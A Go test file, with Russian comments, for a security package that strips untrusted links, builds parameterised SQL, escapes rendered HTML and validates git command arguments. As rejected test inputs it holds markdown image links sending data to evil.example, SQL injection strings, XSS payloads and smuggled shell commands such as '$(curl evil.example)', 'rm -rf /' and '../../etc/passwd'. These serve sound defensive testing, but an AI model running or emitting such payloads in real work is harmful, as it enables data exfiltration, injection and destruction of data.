package secure

import (
	"context"
	"errors"
	"reflect"
	"regexp"
	"strings"
	"testing"
)

func TestStripLinks(t *testing.T) {
	p := URLPolicy{Hosts: []string{"docs.example.com"}}
	cases := []struct{ in, want string }{
		{"См. [гайд](https://docs.example.com/sso).", "См. [гайд](https://docs.example.com/sso)."},
		{"Поддомен ![](https://img.docs.example.com/a.png)", "Поддомен ![](https://img.docs.example.com/a.png)"},
		{"![статус](https://evil.example/p.png?d=секрет)", "[изображение удалено]"},
		{"[Подробнее](https://evil.example/r?u=bob \"title\")", "Подробнее"},
		{"![x](//evil.example/x.png)", "[изображение удалено]"},
		{"![x](h&#116;tps://evil.example/x.png)", "[изображение удалено]"},
		{"[x](/\\evil.example/a)", "x"},
		{"[жми](javascript:alert(1))", "жми)"}, // скобка внутри адреса: ссылка всё равно разрушена
		{"[x](https://docs.example.com@evil.example/)", "x"},
		{"[x](https://docs.example.com.evil.example/)", "x"},
		{"Лого ![l][r]\n[r]: https://evil.example/l.png?q=1", "Лого ![l][r]\n"},
		{"зайдите на https://evil.example/c?d=1 срочно", "зайдите на [ссылка удалена] срочно"},
		{`<img src="https://evil.example/p.png">`, `<img src="[ссылка удалена]">`},
	}
	for _, c := range cases {
		if got, _ := StripLinks(c.in, p); got != c.want {
			t.Errorf("StripLinks(%q)\n got %q\nwant %q", c.in, got, c.want)
		}
	}
}

func TestBuildSelect(t *testing.T) {
	s := Schema{"orders": {"id", "status", "total", "created_at"}}
	q := QuerySpec{Table: "orders", Columns: []string{"id", "status"}, Where: map[string]string{"status": "' OR 1=1 --"}, Limit: 1000}
	sql, args, err := BuildSelect(s, q, "t-42")
	if err != nil {
		t.Fatal(err)
	}
	if want := "SELECT id, status FROM orders WHERE tenant_id = $1 AND status = $2 LIMIT 100"; sql != want {
		t.Fatalf("sql = %q", sql)
	}
	if !reflect.DeepEqual(args, []any{"t-42", "' OR 1=1 --"}) {
		t.Fatalf("args = %v", args) // инъекция осталась значением, а не кодом
	}
	for _, bad := range []QuerySpec{
		{Table: "orders; DROP TABLE orders", Columns: []string{"id"}},
		{Table: "users", Columns: []string{"password_hash"}},
		{Table: "orders", Columns: []string{"id", "(SELECT password_hash FROM users)"}},
		{Table: "orders", Columns: []string{"id"}, Where: map[string]string{"1=1 OR tenant_id": "x"}},
	} {
		if _, _, err := BuildSelect(s, bad, "t-42"); !errors.Is(err, ErrNotAllowed) {
			t.Errorf("%+v: err = %v, want ErrNotAllowed", bad, err)
		}
	}
}

func TestRenderAnswer(t *testing.T) {
	var b strings.Builder
	err := RenderAnswer(&b, `Готово <img src=x onerror=alert(1)><script>steal()</script>`,
		[]Source{{"SSO", "https://docs.example.com/sso"}, {"клик", "javascript:alert(1)"}})
	if err != nil {
		t.Fatal(err)
	}
	out := b.String()
	for _, bad := range []string{"<script", "<img", "javascript:"} {
		if strings.Contains(out, bad) {
			t.Errorf("unescaped %q in %s", bad, out)
		}
	}
	if !strings.Contains(out, "#ZgotmplZ") || !strings.Contains(out, `href="https://docs.example.com/sso"`) {
		t.Errorf("unexpected render: %s", out)
	}
}

func TestCommandBuild(t *testing.T) {
	gitLog := Command{Path: "/usr/bin/git", Fixed: []string{"log", "--oneline", "-n", "20"},
		Arg: regexp.MustCompile(`^[A-Za-z0-9_./-]{1,200}$`), MaxArgs: 3}
	ctx := context.Background()
	cmd, err := gitLog.Build(ctx, []string{"internal/agent.go"})
	if err != nil {
		t.Fatal(err)
	}
	if want := []string{"/usr/bin/git", "log", "--oneline", "-n", "20", "--", "internal/agent.go"}; !reflect.DeepEqual(cmd.Args, want) {
		t.Fatalf("args = %q", cmd.Args)
	}
	for _, bad := range [][]string{
		{"main.go; rm -rf /"},
		{"$(curl evil.example)"},
		{"--output=/tmp/x"},
		{"../../etc/passwd"},
		{"a", "b", "c", "d"},
		{},
	} {
		if _, err := gitLog.Build(ctx, bad); !errors.Is(err, ErrNotAllowed) {
			t.Errorf("%q: err = %v, want ErrNotAllowed", bad, err)
		}
	}
}
